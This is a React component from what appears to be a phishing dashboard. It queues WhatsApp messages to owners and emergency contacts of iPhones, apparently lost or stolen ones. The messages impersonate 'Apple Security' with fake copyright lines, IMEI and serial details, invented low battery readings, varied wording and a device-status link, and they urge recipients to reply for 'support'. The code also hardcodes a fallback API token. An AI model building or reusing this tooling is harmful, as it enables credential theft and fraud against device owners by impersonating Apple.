import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { toast } from '@/hooks/use-toast';
import { Trash2, Send, RefreshCw, Edit, Image, ImageOff } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { getIphoneImageUrl } from '@/utils/iphoneImages';
import { generateRandomMessage } from '@/utils/messageVariations';
import EditProcessDialog from './EditProcessDialog';
import { englishSpeakingCountries } from '@/utils/countries';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode?: boolean;
  status: string;
  created_at: string;
  updated_at: string;
  user_id: string;
  template_id?: string | null;
}

interface ProcessListProps {
  userType: 'admin' | 'user';
}

const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(true);
  const [sendingMessage, setSendingMessage] = useState<string | null>(null);
  const [userCredits, setUserCredits] = useState(0);
  const [editingProcess, setEditingProcess] = useState<Process | null>(null);
  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);
  const [imageStatus, setImageStatus] = useState<{ [key: string]: boolean }>({});

  // English-speaking country codes
  const englishCountryCodes = englishSpeakingCountries.map(c => c.code);

  const getLanguageFromCountryCode = (countryCode: string): 'spanish' | 'english' => {
    // Remove + if present for comparison
    const code = countryCode.startsWith('+') ? countryCode : `+${countryCode}`;
    return englishCountryCodes.includes(code) ? 'english' : 'spanish';
  };

  useEffect(() => {
    loadProcesses();
    loadUserCredits();
    
    const channel = supabase
      .channel('processes-changes')
      .on('postgres_changes', 
        { event: '*', schema: 'public', table: 'processes' },
        (payload) => {
          console.log('Process change detected:', payload);
          loadProcesses();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [userType]);

  useEffect(() => {
    if (processes.length > 0) {
      checkImageAvailability(processes);
      loadUserCredits(); // Reload credits when processes change
    }
  }, [processes]);

  const loadUserCredits = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) return;

      console.log('Loading credits for user:', session.user.id);
      
      const { data: profile, error } = await supabase
        .from('profiles')
        .select('credits')
        .eq('id', session.user.id)
        .maybeSingle();

      console.log('Credits query result:', { profile, error });

      if (error) {
        console.error('Error loading user credits:', error);
        return;
      }

      setUserCredits(profile?.credits || 0);
    } catch (error) {
      console.error('Error loading user credits:', error);
    }
  };

  const loadProcesses = async () => {
    try {
      setLoading(true);
      console.log('Loading processes for userType:', userType);
      
      const { data: { session } } = await supabase.auth.getSession();
      console.log('Current session:', session?.user?.email);

      if (!session) {
        console.log('No session found');
        setProcesses([]);
        return;
      }

      console.log('Loading processes for user:', session.user.id);
      const { data, error } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', session.user.id)
        .order('created_at', { ascending: false });
      
      console.log('Processes query result:', { data, error, userType });

      if (error) {
        console.error('Error loading processes:', error);
        throw error;
      }

      console.log('Processes loaded:', data?.length || 0);
      const processesWithDefaults = data?.map(process => ({
        ...process,
        lost_mode: Boolean((process as any).lost_mode),
        status: (process as any).status || 'nuevo'
      })) || [];
      
      setProcesses(processesWithDefaults);
    } catch (error: any) {
      console.error('Error loading processes:', error);
      toast({
        title: "Error",
        description: `Error al cargar procesos: ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const checkImageExists = async (url: string): Promise<boolean> => {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      return response.ok;
    } catch (error) {
      console.log('Image check failed:', error);
      return false;
    }
  };

  const checkImageAvailability = async (processes: Process[]) => {
    const imageStatusMap: { [key: string]: boolean } = {};
    
    for (const process of processes) {
      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      const hasImage = await checkImageExists(imageUrl);
      imageStatusMap[process.id] = hasImage;
    }
    
    setImageStatus(imageStatusMap);
  };

  const deleteProcess = async (processId: string) => {
    if (!confirm('¿Estás seguro de que quieres eliminar este proceso?')) {
      return;
    }

    try {
      console.log('Deleting process:', processId);
      
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) {
        console.error('Error deleting process:', error);
        throw error;
      }

      toast({
        title: "Proceso eliminado",
        description: "El proceso ha sido eliminado exitosamente",
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('Error deleting process:', error);
      toast({
        title: "Error",
        description: error.message || "Error al eliminar proceso",
        variant: "destructive",
      });
    }
  };

  const handleEditProcess = (process: Process) => {
    setEditingProcess(process);
    setIsEditDialogOpen(true);
  };

  const handleCloseEditDialog = () => {
    setEditingProcess(null);
    setIsEditDialogOpen(false);
  };

  const handleProcessUpdated = () => {
    loadProcesses();
  };

  const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
    try {
      if (userCredits <= 0) {
        toast({
          title: "Sin créditos suficientes",
          description: "No tienes créditos suficientes para enviar mensajes. Contacta al administrador.",
          variant: "destructive",
        });
        return;
      }

      setSendingMessage(process.id);
      console.log(`Adding message to queue for process: ${process.id} in ${language}`);

      const settingsKeys = language === 'spanish' 
        ? ['whatsapp_instance', 'whatsapp_token']
        : ['whatsapp_instance_en', 'whatsapp_token_en'];

      const { data: settings } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', settingsKeys);

      const config = settings?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      const instanceId = language === 'spanish' 
        ? (config?.whatsapp_instance || 'instance126876')
        : (config?.whatsapp_instance_en || 'instance_en_default');
        
      const token = language === 'spanish' 
        ? (config?.whatsapp_token || '4ecj8581tubua7ry')
        : (config?.whatsapp_token_en || 'token_en_default');

      if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
        toast({
          title: "Configuración faltante",
          description: `No hay configuración de WhatsApp para ${language === 'spanish' ? 'español' : 'inglés'}. Configúrala en Configuraciones.`,
          variant: "destructive",
        });
        return;
      }

      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      console.log('Generated iPhone image URL:', imageUrl);

      const imageExists = imageStatus[process.id] !== undefined ? imageStatus[process.id] : await checkImageExists(imageUrl);
      console.log('Image exists:', imageExists);

      const fullPhoneNumber = `${process.country_code}${process.phone_number}`;
      
      let messageContent: string;

      // Check if process has a custom template
      if (process.template_id) {
        const { data: template } = await supabase
          .from('message_templates')
          .select('template_content')
          .eq('id', process.template_id)
          .single();

        if (template) {
          // Replace variables in template
          const customSection = template.template_content
            .replace(/\{client_name\}/g, process.client_name || '')
            .replace(/\{phone_number\}/g, process.phone_number || '')
            .replace(/\{iphone_model\}/g, process.iphone_model || '')
            .replace(/\{storage\}/g, process.storage || '')
            .replace(/\{color\}/g, process.color || '')
            .replace(/\{imei\}/g, process.imei || '')
            .replace(/\{serial_number\}/g, process.serial_number || '')
            .replace(/\{owner_name\}/g, process.owner_name || '')
            .replace(/\{url\}/g, process.url || '');

          // Build complete message with random variations (like normal messages)
          const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
          const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
          
          const openings = [
            "🔐 Notificación de Seguridad de Apple",
            "🛡️ Alert de Seguridad Apple",
            "🔒 Sistema de Seguridad Apple",
            "⚡ Notificación Automática Apple",
            "🔔 Alerta de Dispositivo Apple"
          ];
          
          const messagePhrases = [
            "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
            "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
            "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
            "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
            "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
          ];
          
          const deviceSections = [
            `👤 Propietario: ${process.owner_name || 'No especificado'}
📱 Modelo: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Almacenamiento: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Número de serie: ${process.serial_number}
🔋 Batería: ${battery}%`,
            
            `👤 Usuario: ${process.owner_name || 'No especificado'}
📱 Dispositivo: ${process.iphone_model}
🌈 Color: ${process.color}
💽 Capacidad: ${process.storage}
🔢 IMEI: ${process.imei}
🆔 Serie: ${process.serial_number}
⚡ Nivel batería: ${battery}%`,
            
            `👤 Titular: ${process.owner_name || 'No especificado'}
📱 iPhone: ${process.iphone_model}
🎨 Coloración: ${process.color}
💾 Memoria: ${process.storage}
📟 Código IMEI: ${process.imei}
🔑 No. Serie: ${process.serial_number}
🔋 Carga: ${battery}%`
          ];
          
          const helpPhrases = [
            "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
            "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
            "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
            "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
            "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
          ];
          
          const closings = [
            "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
            "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
            "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
            "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
            "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
          ];

          // Build complete message: opening + custom section + message phrase + device + url + help + closing
          messageContent = `${random(openings)}

${customSection}

${random(messagePhrases)}

${random(deviceSections)}

${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}

${random(helpPhrases)}

${random(closings)}`;
        } else {
          // Fallback to random message if template not found
          const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
          messageContent = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
        }
      } else {
        // Use random message generation
        const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
        messageContent = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
      }

      // Get current user
      const { data: { user } } = await supabase.auth.getUser();
      
      if (!user) {
        throw new Error('Usuario no autenticado');
      }

      // Add message to queue instead of sending directly
      const { error: queueError } = await supabase
        .from('message_queue')
        .insert({
          user_id: user.id,
          process_id: process.id,
          message_content: messageContent,
          recipient_phone: fullPhoneNumber,
          language: language,
          image_url: imageExists ? imageUrl : null,
          template_id: process.template_id || null,
          status: 'pending'
        });

      if (queueError) {
        console.error('Error adding to queue:', queueError);
        const friendly = queueError.message?.includes('MAX_2_MESSAGES_PER_NUMBER')
          ? 'Límite alcanzado: solo puedes tener 2 mensajes pendientes para el mismo número.'
          : 'Error al agregar mensaje a la cola';
        toast({
          title: 'No se pudo agregar',
          description: friendly,
          variant: 'destructive',
        });
        return;
      }

      const { error: updateError } = await supabase
        .from('processes')
        .update({ 
          status: 'en cola',
          updated_at: new Date().toISOString()
        })
        .eq('id', process.id);

      if (updateError) {
        console.error('Error updating process status:', updateError);
      }

      // Notify admin that a new message was queued
      try {
        await supabase.functions.invoke('process-message-queue', {
          body: {
            notifyAdmin: true,
            messageId: null // Just notify, don't process yet
          }
        });
      } catch (notifyError) {
        console.error('Error notifying admin:', notifyError);
        // Don't fail the whole process if notification fails
      }

      const { battery } = generateDynamicValues();
      const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
      const languageText = language === 'spanish' ? 'español' : 'inglés';
      const contactTypeText = process.contact_type === 'propietario' ? 'propietario' : 'contacto de emergencia';
      const templateText = process.template_id ? ' (usando plantilla personalizada)' : '';
      
      toast({
        title: "Mensaje agregado a la cola",
        description: `Mensaje ${messageType} en ${languageText} para ${process.client_name} (${contactTypeText})${templateText}. Se enviará automáticamente en 5 minutos. Batería: ${battery}%.`,
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('Error sending WhatsApp message:', error);
      toast({
        title: "Error de envío",
        description: `${error.message}. No se han descontado créditos.`,
        variant: "destructive",
      });
    } finally {
      setSendingMessage(null);
    }
  };

  const generateDynamicValues = () => {
    // Batería aleatoria por debajo del 40%
    const battery = Math.floor(Math.random() * 35) + 5; // Entre 5% y 39%
    
    // Fecha/hora con 2 horas de retraso
    const now = new Date();
    const delayedTime = new Date(now.getTime() - 2 * 60 * 60 * 1000); // 2 horas atrás
    
    const formatDate = (date: Date, language: 'spanish' | 'english') => {
      if (language === 'spanish') {
        return date.toLocaleDateString('es-ES', { 
          day: '2-digit', 
          month: '2-digit', 
          year: 'numeric' 
        });
      } else {
        return date.toLocaleDateString('en-US', { 
          month: '2-digit', 
          day: '2-digit', 
          year: 'numeric' 
        });
      }
    };
    
    const formatTime = (date: Date) => {
      return date.toLocaleTimeString('es-ES', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: false
      });
    };

    return {
      battery,
      delayedTime,
      formatDate,
      formatTime
    };
  };

  if (loading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="p-6">
          <p className="text-blue-200/70 text-center">Cargando procesos...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-bold text-blue-300">
          Mis Procesos ({processes.length})
        </h2>
        <div className="flex items-center space-x-4">
          <div className="bg-gradient-to-r from-purple-600 to-purple-800 text-white px-4 py-2 rounded-lg">
            <span className="text-sm">Créditos: {userCredits}</span>
          </div>
          <Button
            onClick={loadProcesses}
            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-300"
            size="sm"
          >
            <RefreshCw className="h-4 w-4 mr-2" />
            Actualizar
          </Button>
        </div>
      </div>

      {processes.length === 0 ? (
        <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
          <CardContent className="p-8">
            <div className="text-center">
              <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
              <p className="text-blue-200/50 text-sm">
                Los procesos que agregues aparecerán aquí listos para enviar.
              </p>
            </div>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-4">
          {processes.map((process) => (
            <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
              <CardHeader>
                <div className="flex flex-col lg:flex-row lg:justify-between lg:items-start gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-2">
                      <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                      {imageStatus[process.id] !== undefined && (
                        <div className="flex items-center gap-1">
                          {imageStatus[process.id] ? (
                            <div className="flex items-center gap-1 bg-green-600/20 text-green-300 px-2 py-1 rounded-full text-xs">
                              <Image className="h-3 w-3" />
                              <span>Con imagen</span>
                            </div>
                          ) : (
                            <div className="flex items-center gap-1 bg-orange-600/20 text-orange-300 px-2 py-1 rounded-full text-xs">
                              <ImageOff className="h-3 w-3" />
                              <span>Sin imagen</span>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                    <p className="text-blue-200/70 text-sm">
                      {process.country_code} {process.phone_number} ({process.contact_type})
                    </p>
                    {process.owner_name && (
                      <p className="text-blue-200/60 text-xs mt-1">
                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
                      </p>
                    )}
                    {process.lost_mode && (
                      <p className="text-orange-400 text-xs mt-1 font-medium">
                        📱 En modo perdido
                      </p>
                    )}
                  </div>
                  <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
                    <Badge 
                      variant={process.status === 'enviado' ? 'default' : 'secondary'}
                      className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
                    >
                      {process.status}
                    </Badge>
                    
                    {/* Botón de envío único */}
                    <Button
                      size="sm"
                      onClick={() => sendWhatsAppMessage(process, getLanguageFromCountryCode(process.country_code))}
                      disabled={sendingMessage === process.id || userCredits <= 0}
                      className={`${
                        userCredits <= 0 
                          ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                          : 'bg-blue-600/20 hover:bg-blue-600/30 text-blue-300'
                      } w-full sm:w-auto min-w-[120px] text-xs sm:text-sm`}
                      title={userCredits <= 0 ? "Sin créditos suficientes" : `Enviar en ${getLanguageFromCountryCode(process.country_code) === 'english' ? 'inglés' : 'español'}`}
                    >
                      {sendingMessage === process.id ? (
                        <RefreshCw className="h-4 w-4 animate-spin" />
                      ) : (
                        <>
                          <Send className="h-4 w-4 mr-2" />
                          Enviar {getLanguageFromCountryCode(process.country_code) === 'english' ? '🇺🇸' : '🇪🇸'}
                        </>
                      )}
                    </Button>

                    {/* Botones de acción */}
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        onClick={() => handleEditProcess(process)}
                        className="bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-300"
                        title="Editar proceso"
                      >
                        <Edit className="h-4 w-4" />
                      </Button>

                      <Button
                        size="sm"
                        onClick={() => deleteProcess(process.id)}
                        className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
                        title="Eliminar proceso"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                  <div>
                    <p className="text-blue-200/50">Modelo:</p>
                    <p className="text-blue-200">{process.iphone_model}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Almacenamiento:</p>
                    <p className="text-blue-200">{process.storage}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Color:</p>
                    <p className="text-blue-200">{process.color}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">IMEI:</p>
                    <p className="text-blue-200">{process.imei}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Número de Serie:</p>
                    <p className="text-blue-200">{process.serial_number}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Tipo de Contacto:</p>
                    <p className="text-blue-200">{process.contact_type}</p>
                  </div>
                  {process.owner_name && (
                    <div>
                      <p className="text-blue-200/50">
                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
                      </p>
                      <p className="text-blue-200">{process.owner_name}</p>
                    </div>
                  )}
                  {process.url && (
                    <div className="md:col-span-2 lg:col-span-3">
                      <p className="text-blue-200/50">URL:</p>
                      <p className="text-blue-200 break-all">{process.url}</p>
                    </div>
                  )}
                  <div className="md:col-span-2 lg:col-span-3">
                    <p className="text-blue-200/50">Creado:</p>
                    <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}

      <EditProcessDialog
        process={editingProcess}
        isOpen={isEditDialogOpen}
        onClose={handleCloseEditDialog}
        onProcessUpdated={handleProcessUpdated}
      />
    </div>
  );
};

export default ProcessList;
